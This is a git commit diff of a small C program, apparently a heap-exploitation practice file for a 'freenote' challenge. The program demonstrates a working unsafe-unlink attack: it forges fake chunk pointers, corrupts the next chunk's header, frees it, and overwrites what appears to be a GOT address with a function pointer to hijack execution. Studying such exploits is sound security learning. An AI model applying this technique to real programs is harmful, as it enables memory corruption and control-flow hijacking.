4f8e031609a0b299e65ffd056f32d6017dbf10af
Kichang Yang <kichangya@gmail.com>
2017-10-26 20:57:20 -0700

    .

--- freenote/babo.c
+++ freenote/babo.c
@@ -12,34 +12,37 @@ uint64_t *chunk0_ptr;
 
 void babo()
 {
-    printf("%s!\n", "Babo");
+    fprintf(stderr, "%s!\n", "Babo");
 }
 
 int main()
 {
     int malloc_size = 0x80;
-    int header_size = 2;
 
     chunk0_ptr = (uint64_t*) malloc(malloc_size);
     uint64_t *chunk1_ptr = (uint64_t*) malloc(malloc_size);
 
-    printf("&chunk0_ptr: %p\n", &chunk0_ptr);
-    printf("chunk0_ptr: %p\n", chunk0_ptr);
-    printf("sizeof(size_t): %ld\n", sizeof(size_t));
-    printf("sizeof(uint64_t): %ld\n", sizeof(uint64_t));
+    fprintf(stderr, "&chunk0_ptr: %p\n", &chunk0_ptr);
+    fprintf(stderr, "chunk0_ptr: %p\n", chunk0_ptr);
+    fprintf(stderr, "sizeof(size_t): %ld\n", sizeof(size_t));
+    fprintf(stderr, "sizeof(uint64_t): %ld\n", sizeof(uint64_t));
 
     chunk0_ptr[0] = 0;
     chunk0_ptr[1] = sizeof(size_t);
     chunk0_ptr[2] = (uint64_t)&chunk0_ptr - (sizeof(uint64_t)*3); // fd
     chunk0_ptr[3] = (uint64_t)&chunk0_ptr - (sizeof(uint64_t)*2); // bk
 
-    uint64_t *chunk1_hdr = chunk1_ptr - header_size;
+    uint64_t *chunk1_hdr = chunk1_ptr;
+
+    chunk1_hdr--;
+    chunk1_hdr--;
+
     chunk1_hdr[0] = malloc_size;
     chunk1_hdr[1] &= ~1;
 
     free(chunk1_ptr);
     
-    printf("chunk0_ptr: %p\n", chunk0_ptr);
+    fprintf(stderr, "chunk0_ptr: %p\n", chunk0_ptr);
 
     *(chunk0_ptr+3) = 0x601020LL;
     *chunk0_ptr = (uint64_t)babo;
